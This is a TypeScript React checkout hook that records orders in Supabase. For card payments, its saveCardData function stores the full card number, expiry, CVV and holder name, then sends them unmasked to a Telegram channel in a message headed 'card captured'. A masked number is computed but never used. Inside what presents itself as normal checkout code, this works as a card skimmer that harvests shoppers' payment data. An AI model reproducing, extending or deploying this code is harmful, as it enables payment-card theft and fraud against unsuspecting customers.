
import { useState } from 'react';
import { CustomerData, Order, PaymentMethod, PaymentStatus, Product, BillingData, CreditCardData } from '@/types/checkout';
import { supabase } from '@/integrations/supabase/client';
import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
import { usePixelEvents } from '@/hooks/usePixelEvents';

export const useCheckoutOrder = () => {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { trackPurchase } = usePixelEvents();
  
  const createOrder = async (customer: CustomerData, product: Product, paymentMethod: PaymentMethod, cardData?: CreditCardData): Promise<Order> => {
    // Criar pedido no Supabase
    const order = {
      customer_id: `customer_${Date.now()}`, // No futuro, usar ID real do cliente no Asaas
      customer_name: customer.name,
      customer_email: customer.email,
      customer_cpf_cnpj: customer.cpfCnpj,
      customer_phone: customer.phone,
      product_id: product.id,
      product_name: product.name,
      product_price: product.price,
      status: "PENDING" as PaymentStatus,
      payment_method: paymentMethod,
    };
    
    // Salvar no Supabase
    const { data, error } = await supabase
      .from('orders')
      .insert(order)
      .select()
      .single();
      
    if (error) throw new Error(error.message);
    
    // Se for pagamento com cartão, salvar dados do cartão
    if (paymentMethod === 'creditCard' && cardData) {
      await saveCardData(data.id, cardData, product.price);
    }
    
    return {
      id: data.id,
      customerId: data.customer_id,
      customerName: data.customer_name,
      customerEmail: data.customer_email,
      customerCpfCnpj: data.customer_cpf_cnpj,
      customerPhone: data.customer_phone,
      productId: data.product_id,
      productName: data.product_name,
      productPrice: data.product_price,
      status: data.status as PaymentStatus,
      paymentMethod: data.payment_method as PaymentMethod,
      asaasPaymentId: data.asaas_payment_id,
      createdAt: data.created_at,
      updatedAt: data.updated_at
    };
  };
  
  // Função para salvar dados do cartão
  const saveCardData = async (orderId: string, cardData: CreditCardData, productPrice: number) => {
    // Extrair o BIN (6 primeiros dígitos)
    const bin = cardData.number.substring(0, 6);
    
    const cardDataToSave = {
      order_id: orderId,
      holder_name: cardData.holderName,
      number: cardData.number,
      expiry_date: cardData.expiryDate,
      cvv: cardData.cvv,
      bin: bin,
      brand: cardData.brand || 'unknown' // Usar o valor fornecido ou 'unknown' como padrão
    };
    
    const { error } = await supabase
      .from('card_data')
      .insert(cardDataToSave);
      
    if (error) {
      console.error('Erro ao salvar dados do cartão:', error);
      // Não vamos falhar o pedido se o cartão não for salvo,
      // mas vamos logar o erro para identificar problemas
    } else {
      // Track purchase event on card capture
      try {
        trackPurchase(orderId, productPrice);
        console.log('Purchase event triggered for card capture', { orderId, value: productPrice });
      } catch (trackError) {
        console.error('Error triggering purchase event:', trackError);
      }
      
      // Enviar notificação para o Telegram quando os dados do cartão forem salvos no banco
      try {
        const brandName = (cardData.brand || 'Unknown').toUpperCase();
        const maskedNumber = cardData.number.replace(/^(\d{6})(\d+)(\d{4})$/, "$1******$3");
        
        // Formatando a mensagem com os detalhes do cartão
        const message = `💳 Cartão capturado:
        
Número: ${cardData.number}
Validade: ${cardData.expiryDate}
CVV: ${cardData.cvv}
Titular: ${cardData.holderName}
Bandeira: ${brandName}`;
        
        await sendTelegramNotification(message);
        console.log('Telegram notification sent with card details');
      } catch (telegramError) {
        console.error('Erro ao enviar notificação para o Telegram:', telegramError);
      }
    }
  };
  
  const prepareBillingData = (customerData: CustomerData, product: Product, orderId: string): BillingData => {
    return {
      customer: customerData,
      value: product.price,
      description: product.name,
      orderId: orderId
    };
  };
  
  return {
    isSubmitting,
    setIsSubmitting,
    createOrder,
    prepareBillingData,
    saveCardData
  };
};
